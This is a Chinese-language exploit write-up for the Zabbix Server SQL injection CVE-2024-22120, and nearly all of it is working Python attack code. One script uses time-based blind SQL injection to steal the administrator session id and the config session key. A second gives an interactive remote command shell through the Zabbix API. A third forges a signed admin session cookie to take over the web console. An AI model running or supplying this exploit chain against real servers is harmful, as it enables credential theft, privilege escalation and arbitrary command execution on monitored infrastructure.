## Zabbix-Serve-SQL注入漏洞(CVE-2024-22120)

zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。

CVE-2024-22120 中，攻击者在登陆后可构造恶意请求利用clientip参数造成SQL注入。



`漏洞利用成功前提`：需要一个低权限用户，并且该用户需要具有`Detect operating system`的权限，但是这个操作默认的是没有的，只有管理员用户组才有



## 获取管理员session id 脚本

```python
import json
import argparse
from pwn import *
from datetime import datetime

def send_message(ip, port, sid, hostid, injection):
    zbx_header = "ZBXD\x01".encode()
    message = {
        "request": "command",
        "sid": sid,
        "scriptid": "3",
        "clientip": "' + " + injection + "+ '",
        "hostid": hostid
    }
    message_json = json.dumps(message)
    message_length = struct.pack('<q', len(message_json))
    message = zbx_header + message_length + message_json.encode()
    #print("Sending message %s" % message)
    r = remote(ip, port, level='debug')
    r.send(message)
    response = r.recv(1024)
    r.close()
    print(response)

def extract_admin_session_id(ip, port, sid, hostid, time_false, time_true):
    session_id = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            print("\n(+) trying c=%s" % c, end="", flush=True)
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)" % (i, ord(c), time_true, time_false)
            send_message(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                session_id += c
                print("(+) session_id=%s" % session_id, end="", flush=True)
                break
    print("\n")
    return session_id

def extract_config_session_key(ip, port, sid, hostid, time_false, time_true):
    token = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            print("\n(+) trying c=%s" % c, end="", flush=True)
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (ascii(substr((select session_key from config),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)" % (i, ord(c), time_true, time_false)
            send_message(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                token += c
                print("(+) session_key=%s" % token, end="", flush=True)
                break
    print("\n")
    return token

def tiny_poc(ip, port, sid, hostid):
    print("(+) Running simple PoC...\n", end="", flush=True)
    print("(+) Sleeping for 1 sec...\n", end="", flush=True)
    before_query = datetime.now().timestamp()
    query = "(select sleep(1))"
    send_message(ip, port, sid, hostid, query)
    after_query = datetime.now().timestamp()
    print("(+) Request time: %d\n" % (after_query-before_query))
    print("(+) Sleeping for 5 sec...\n", end="", flush=True)
    before_query = datetime.now().timestamp()
    query = "(select sleep(5))"
    send_message(ip, port, sid, hostid, query)
    after_query = datetime.now().timestamp()
    print("(+) Request time: %d\n" % (after_query - before_query))
    print("(+) Sleeping for 10 sec...\n", end="", flush=True)
    before_query = datetime.now().timestamp()
    query = "(select sleep(10))"
    send_message(ip, port, sid, hostid, query)
    after_query = datetime.now().timestamp()
    print("(+) Request time: %d\n" % (after_query - before_query))

def poc_to_check_in_zabbix_log(ip, port, sid, hostid):
    print("(+) Sending SQL request for MySQL version...\n", end="", flush=True)
    query = "(version())"
    send_message(ip, port, sid, hostid, query)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Command-line option parser example')
    parser.add_argument("--false_time", help="Time to sleep in case of wrong guess(make it smaller than true time, default=1)", default="1")
    parser.add_argument("--true_time", help="Time to sleep in case of right guess(make it bigger than false time, default=10)", default="10")
    parser.add_argument("--ip", help="Zabbix server IP")
    parser.add_argument("--port", help="Zabbix server port(default=10051)", default="10051")
    parser.add_argument("--sid", help="Session ID of low privileged user")
    parser.add_argument("--hostid", help="hostid of any host accessible to user with defined sid")
    parser.add_argument("--poc", action='store_true', help="Use this key if you want only PoC, PoC will simply make sleep 1,2,5 seconds on mysql server", default=False)
    parser.add_argument("--poc2", action='store_true', help="Use this key to simply generate error in zabbix logs, check logs later to see results", default=False)
    args = parser.parse_args()
    if args.poc:
        tiny_poc(args.ip, int(args.port), args.sid, args.hostid)
    elif args.poc2:
        poc_to_check_in_zabbix_log(args.ip, int(args.port), args.sid, args.hostid)
    else:
        print("(+) Extracting Zabbix config session key...\n", end="", flush=True)
        config_session_key = extract_config_session_key(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
        print("(+) config session_key=%s\n" % config_session_key, end="", flush=True)
        print("(+) Extracting admin session_id...")
        admin_sessionid = extract_admin_session_id(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
        print("(+) admin session_id=%s\n" % admin_sessionid, end="", flush=True)
        print("(+) session_key=%s, admin session_id=%s. Now you can genereate admin zbx_cookie and sign it with session_key" % (config_session_key, admin_sessionid))
```



## RCE脚本

利用获取到的session_id rce

```python
import requests
import json

ZABIX_ROOT = "http://192.168.198.136"
url = ZABIX_ROOT + "/api_jsonrpc.php"
host_id = "10084"
session_id = "00000000000000000000000000000000"
headers = {
    "content-type": "application/json",
}
auth = json.loads('{"jsonrpc": "2.0", "result": "' + session_id + '", "id": 0}')

while True:
    cmd = input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "":
        print("Result of last command:")
    elif cmd == "quit":
        break
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": "" + cmd + ""
        },
        "auth": auth['result'],
        "id": 0,
    }
    cmd_upd = requests.post(url, data=json.dumps(payload), headers=headers)
    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": "" + host_id + ""
        },
        "auth": auth['result'],
        "id": 0,
    }
    cmd_exe = requests.post(url, data=json.dumps(payload), headers=headers)
    cmd_exe_json = cmd_exe.json()
    if "error" not in cmd_exe.text:
        print(cmd_exe_json["result"]["value"])
    else:
        print(cmd_exe_json["error"]["data"])

```



##  利用获取到的管理员session id和session key构造zbx_session登录管理界面

```python
import hmac
import json
import argparse
import requests
from pwn import *
from datetime import datetime

def SendMessage(ip, port, sid, hostid, injection):
    context.log_level = "CRITICAL"
    zbx_header = "ZBXD\x01".encode()
    message = {
        "request": "command",
        "sid": sid,
        "scriptid": "1",
        "clientip": "' + " + injection + "+ '",
        "hostid": hostid
    }
    message_json = json.dumps(message)
    message_length = struct.pack('<q', len(message_json))
    message = zbx_header + message_length + message_json.encode()
    r = remote(ip, port, level="CRITICAL")
    r.send(message)
    r.recv(1024)
    r.close()

def ExtractConfigSessionKey(ip, port, sid, hostid, time_false, time_true):
    token = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (ascii(substr((select session_key from config),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)" % (i, ord(c), time_true, time_false)
            SendMessage(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                token += c
                print("(+) session_key=%s" % token, flush=True)
                break
    return token


def ExtractAdminSessionId(ip, port, sid, hostid, time_false, time_true):
    session_id = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),%d,1))=%d) THEN sleep(%d) ELSE sleep(%d) END)" % (i, ord(c), time_true, time_false)
            SendMessage(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                session_id += c
                print("(+) session_id=%s" % session_id, flush=True)
                break
    return session_id

def GenerateAdminSession(sessionid, session_key):
    def sign(data: str) -> str:
        key = session_key.encode()
        return hmac.new(key, data.encode('utf-8'), hashlib.sha256).hexdigest()

    def prepare_data(data: dict) -> str:
        sorted_data = OrderedDict(data.items())
        sorted_data['sign'] = sign(json.dumps(sorted_data, separators=(',', ':')))
        return base64.b64encode(json.dumps(sorted_data, separators=(',', ':')).encode('utf-8')).decode('utf-8')

    session = {
        "sessionid": sessionid,
        "serverCheckResult": True,
        "serverCheckTime": int(time.time())
    }
    res = prepare_data(session)
    return res

def CheckAdminSession(ip, admin_session):
    proxy = {
        "https": "http://127.0.0.1:8083",
        "http": "http://127.0.0.1:8083"
    }
    url = f"http://{ip}/zabbix.php?action=dashboard.view"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Cookie": f"zbx_session={admin_session}"
    }
    resp = requests.get(url=url, headers=headers, timeout=10, proxies=proxy)
    if "Administration" in resp.text and resp.status_code == 200:
        return admin_session
    else:
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-22120-LoginAsAdmin")
    parser.add_argument("--false_time",
                        help="Time to sleep in case of wrong guess(make it smaller than true time, default=1)",
                        default="1")
    parser.add_argument("--true_time",
                        help="Time to sleep in case of right guess(make it bigger than false time, default=10)",
                        default="10")
    parser.add_argument("--ip", help="Zabbix server IP")
    parser.add_argument("--port", help="Zabbix server port(default=10051)", default="10051")
    parser.add_argument("--sid", help="Session ID of low privileged user")
    parser.add_argument("--hostid", help="hostid of any host accessible to user with defined sid")
    args = parser.parse_args()
    admin_sessionid = ExtractAdminSessionId(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
    session_key = ExtractConfigSessionKey(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
    admin_session = GenerateAdminSession(admin_sessionid, session_key)
    res = CheckAdminSession(args.ip, admin_session)
    if res is not None:
        print(f"try replace cookie with:\nzbx_session={res}")
    else:
        print("failed")
```



## 漏洞来源

- https://mp.weixin.qq.com/s/vF0xkB-j_HjI0pcQoh94KQ
- https://github.com/W01fh4cker/CVE-2024-22120-RCE